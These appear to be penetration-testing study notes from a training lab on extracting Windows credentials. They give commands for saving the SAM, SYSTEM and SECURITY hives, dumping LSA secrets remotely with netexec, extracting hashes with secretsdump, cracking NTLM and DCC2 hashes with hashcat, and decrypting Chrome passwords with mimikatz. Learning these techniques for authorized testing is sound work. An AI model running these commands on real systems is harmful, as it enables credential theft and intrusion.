## Registry hives

There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes.

| Registry Hive   | Description                                                                                                                                                       |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `HKLM\SAM`      | Contains password hashes for local user accounts.                                                                                                                 |
| `HKLM\SYSTEM`   | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.                                                |
| `HKLM\SECURITY` | Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more. |
Theses files are located at `C:\Windows\System32\config`

---


## Remote dumping & LSA Secrets

```shell
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
### Dumping LSA

netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
### Dumping SAM
```

---

## reg.exe (admin)

```PowerShell
C:\WINDOWS\system32> reg.exe save hklm\sam C:\temp\sam

C:\WINDOWS\system32> reg.exe save hklm\system C:\temp\system

C:\WINDOWS\system32> reg.exe save hklm\security C:\temp\security
```

---

## Dumping hashes with secretsdump

```shell
secretsdump.py -sam sam -security security -system system LOCAL
```

---

## Cracking hashes with Hashcat

```shell
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

---

## DCC2 hashes

`hklm\security` contains cached domain logon information, in form of `DCC2` hashes.

```shell
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

---

## DPAPI

The Data Protection Application Programming Interface [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection), is a set of APIs in Windows used to encrypt and decrypt data blobs on a per-user basis.

| Applications                | Use of DPAPI                                                                                |
| --------------------------- | ------------------------------------------------------------------------------------------- |
| `Internet Explorer`         | Password form auto-completion data (username and password for saved sites).                 |
| `Google Chrome`             | Password form auto-completion data (username and password for saved sites).                 |
| `Outlook`                   | Passwords for email accounts.                                                               |
| `Remote Desktop Connection` | Saved credentials for connections to remote machines.                                       |
| `Credential Manager`        | Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more. |
DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).

```PowerShell
C:\Users\Public> mimikatz.exe

mimikatz> dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect

Password: April2025!
```


---